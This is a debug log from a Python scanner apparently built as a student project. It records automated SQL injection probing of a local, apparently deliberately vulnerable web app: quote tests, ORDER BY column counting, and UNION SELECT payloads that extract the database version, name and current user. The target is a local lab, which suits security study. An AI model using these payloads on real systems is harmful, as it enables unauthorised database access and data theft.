INFO [2022-05-26 09:46:38,786] root 184317 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 16:02:21,320] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:21,323] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,325] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-05-28 16:02:21,328] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,332] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:21,335] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,338] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:21,342] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,345] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:21,349] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,353] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:21,356] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,358] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:21,361] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,364] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:21,367] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,370] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:21,373] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,375] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:21,378] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,381] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-05-28 16:02:21,390] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,394] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:21,403] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,406] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:21,414] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,417] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20(SELECT+CURRENT_USER),%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:21,423] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,425] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20(SELECT+CURRENT_USER),%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:21,431] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,434] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20(SELECT+CURRENT_USER),%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:21,440] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,442] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20(SELECT+CURRENT_USER),%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:21,449] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,453] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20(SELECT+CURRENT_USER),%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:21,459] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:21,462] urllib3.connectionpool 414701 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20(SELECT+CURRENT_USER) HTTP/1.1" 200 3238]
INFO [2022-05-28 16:02:29,000] root 414773 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 16:02:29,318] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,340] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 16:02:29,343] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,349] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 16:02:29,354] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,358] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-05-28 16:02:29,361] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,366] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-05-28 16:02:29,369] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,372] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:29,375] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,378] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:29,383] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,387] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:29,390] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,392] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:29,396] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,401] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:29,404] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,406] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+6 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:29,408] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,411] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+7 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:29,415] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,419] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:02:29,421] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,423] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-05-28 16:02:29,426] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,431] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:29,434] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,437] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20version(),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:29,441] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,445] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20version(),%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:29,448] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,453] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20version(),%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:29,456] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,459] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20version(),%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:29,463] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,465] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20version(),%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:29,468] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,470] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20version(),%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:29,473] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,475] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20version() HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:02:29,478] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,481] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+database(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3227]
DEBUG [2022-05-28 16:02:29,488] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,490] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+(SELECT+CURRENT_USER),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:29,496] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,499] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%20(SELECT+CURRENT_USER),%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:29,509] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,513] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%20(SELECT+CURRENT_USER),%204,%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:29,521] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,524] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%20(SELECT+CURRENT_USER),%205,%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:29,531] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,534] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%20(SELECT+CURRENT_USER),%206,%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:29,540] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,542] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%20(SELECT+CURRENT_USER),%207,%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:29,549] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,551] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%20(SELECT+CURRENT_USER),%208 HTTP/1.1" 200 3238]
DEBUG [2022-05-28 16:02:29,557] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:02:29,560] urllib3.connectionpool 414773 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+1,%202,%203,%204,%205,%206,%207,%20(SELECT+CURRENT_USER) HTTP/1.1" 200 3238]
INFO [2022-05-28 16:03:42,949] root 414854 /home/CECULAR/MD-SPIDER/projecto-final-curso-main/MD-SPIDER/spider [[Start on -Linux-5.16.0-kali5-amd64-x86_64-with-glibc2.33 ]]
DEBUG [2022-05-28 16:03:43,275] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,300] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 16:03:43,304] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,308] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0 HTTP/1.1" 200 3182]
DEBUG [2022-05-28 16:03:43,312] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,315] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "HEAD /bricks/content-1/index.php?id=0' HTTP/1.1" 200 0]
DEBUG [2022-05-28 16:03:43,319] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,323] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "POST /bricks/content-1/index.php?id=0' HTTP/1.1" 200 1713]
DEBUG [2022-05-28 16:03:43,327] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,331] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+1 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:03:43,333] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,337] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+2 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:03:43,340] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,344] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+3 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:03:43,349] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,351] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+4 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:03:43,356] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,361] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+5 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:03:43,365] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,369] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+6 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:03:43,371] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,374] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+7 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:03:43,377] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,380] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+8 HTTP/1.1" 200 3193]
DEBUG [2022-05-28 16:03:43,383] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,385] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+ORDER+BY+9 HTTP/1.1" 200 1713]
DEBUG [2022-05-28 16:03:43,388] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
DEBUG [2022-05-28 16:03:43,391] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [http://localhost:80 "GET /bricks/content-1/index.php?id=0+UNION+SELECT+version(),%202,%203,%204,%205,%206,%207,%208 HTTP/1.1" 200 3226]
DEBUG [2022-05-28 16:03:43,395] urllib3.connectionpool 414854 /usr/lib/python3/dist-packages/urllib3/connectionpool.py [Starting new HTTP connection (1): localhost:80]
